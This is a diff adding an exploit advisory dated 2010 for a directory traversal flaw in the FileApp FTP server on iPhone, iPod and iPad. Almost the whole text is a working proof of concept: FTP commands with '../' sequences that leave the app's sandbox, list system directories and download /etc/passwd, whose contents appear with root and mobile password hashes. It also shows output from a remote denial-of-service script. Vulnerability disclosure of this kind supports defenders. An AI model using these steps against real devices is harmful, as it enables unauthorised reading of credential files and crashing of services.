@@ -1,0 +1,103 @@
+# Title : FileApp < 2.0 directory traversal for iPhone,iPod,iPad
+# Date : 02/10/2010
+# Author : m0ebiusc0de
+# Software : http://www.digidna.net/products/fileapp/download
+# Version : FileApp < v.2.0, iPad 3.2.2 (jailed)
+# Tested on : Windows XP PRO SP3
+
+[+][+] 0x01. Directory Traversal PoC [+][+]
+
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Administrator>ftp
+ftp> open
+To 192.168.1.100 2121
+Connected to 192.168.1.100.
+220 FileApp - FTP Server
+User (192.168.1.100:(none)):
+331 Password please.
+Password:
+230 User logged in.
+ftp> dir
+200 PORT 192.168.1.106:46885 OK
+150 BINARY data connection established.
+drwxr-xr-x   2 501      501      1564 Sep 29 18:10 Start Here
+-rw-r--r--   1 501      501      1335 Sep 29 13:42 a.html
+226 Directory list has been submitted.
+ftp: 122 bytes received in 0.00Seconds 122000.00Kbytes/sec.
+ftp> cd ../../../../../../
+250 OK
+ftp> dir
+200 PORT 192.168.1.106:46887 OK
+150 BINARY data connection established.
+drwxrwxr-x  19 0        80       646 Aug  5 14:18 Applications
+drwxrwxr-x   2 0        80       68 May 29 08:51 Developer
+drwxrwxr-x  15 0        80       646 Aug  5 14:18 Library
+drwxr-xr-x   3 0        0        102 May 29 08:56 System
+drwxr-xr-x   2 0        0        102 Aug  5 14:23 bin
+drwxrwxr-x   2 0        80       68 Jan 16 03:56 cores
+dr-xr-xr-x   3 0        0        1353 Oct  2 17:58 dev
+lrwxrwxrwx   1 0        80       11 Aug  5 14:18 etc -> private/etc
+drwxr-xr-x   4 0        0        136 Sep 12 20:06 private
+drwxr-xr-x   2 0        0        442 Aug  5 14:23 sbin
+drwxr-xr-x   7 0        0        238 Aug  5 14:11 usr
+lrwxrwxrwx   1 0        80       11 Aug  5 14:18 var -> private/var
+226 Directory list has been submitted.
+ftp: 716 bytes received in 0.02Seconds 44.75Kbytes/sec.
+ftp> cd ../../../../../../etc/
+250 OK
+ftp> dir
+200 PORT 192.168.1.106:46888 OK
+150 BINARY data connection established.
+drwxr-xr-x   2 0        0        272 May 29 09:06 bluetool
+-rw-r--r--   1 0        0        78 Sep 12 20:06 fstab
+-rw-r--r--   1 0        0        1262 Jan 16 03:56 group
+-rw-r--r--   1 0        0        236 Jan 16 03:56 hosts
+-rw-r--r--   1 0        0        0 Jan 16 03:56 hosts.equiv
+-rw-r--r--   1 0        0        53 Jan 16 03:56 networks
+-rw-r--r--   1 0        0        132 May 29 07:12 notify.conf
+-rw-r--r--   1 0        0        611 Jan 16 03:56 passwd
+drwxr-xr-x   2 0        0        68 Aug  5 10:15 ppp
+-rw-r--r--   1 0        0        5766 Jan 16 03:56 protocols
+drwxr-xr-x   3 0        0        170 May 29 08:03 racoon
+-rw-r--r--   1 0        0        677959 Jan 16 03:56 services
+-rw-r--r--   1 0        0        1367 Jan 16 03:56 ttys
+226 Directory list has been submitted.
+ftp: 766 bytes received in 0.02Seconds 47.88Kbytes/sec.
+ftp> get ../../../../../../etc/passwd
+200 PORT 192.168.1.106:46894 OK
+150 BINARY data connection established.
+226 File transmission successful.
+ftp: 611 bytes received in 0.00Seconds 611000.00Kbytes/sec.
+ftp> quit
+221 Thanks for using FileApp !
+
+C:\Documents and Settings\Administrator>cat passwd
+##
+# User Database
+#
+# This file is the authoritative user database.
+##
+nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
+root:/smx7MYTQIi2M:0:0:System Administrator:/var/root:/bin/sh
+mobile:/smx7MYTQIi2M:501:501:Mobile User:/var/mobile:/bin/sh
+daemon:*:1:1:System Services:/var/root:/usr/bin/false
+_wireless:*:25:25:Wireless Services:/var/empty:/usr/bin/false
+_securityd:*:64:64:securityd:/var/empty:/usr/bin/false
+_mdnsresponder:*:65:65:mDNSResponder:/var/empty:/usr/bin/false
+_sshd:*:75:75:sshd Privilege separation:/var/empty:/usr/bin/false
+_unknown:*:99:99:Unknown User:/var/empty:/usr/bin/false
+
+C:\Documents and Settings\Administrator>
+
+[+][+] 0x02. Remote DoS PoC TEST [+][+]
+
+C:\Python25>python FileApp_DoS.py 192.168.1.100
+[+] Connecting to the target..
+[+] Exploited!
+
+C:\Python25>python FileApp_DoS.py 192.168.1.100
+[-] Connection error!
+
+C:\Python25>
